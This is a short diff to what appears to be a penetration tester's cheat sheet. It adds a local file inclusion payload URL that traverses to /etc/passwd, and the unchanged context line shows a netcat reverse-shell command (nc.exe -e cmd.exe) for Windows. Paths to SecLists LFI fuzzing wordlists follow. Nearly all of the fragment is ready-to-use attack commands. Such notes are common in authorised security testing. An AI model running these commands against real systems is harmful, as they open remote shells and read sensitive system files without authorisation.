@@ -118,6 +118,8 @@ Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
 
 #### LFI
 
+<code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=../../../../../../etc/passwd</code>
+
 Linux: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>
 
 Windows: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code>
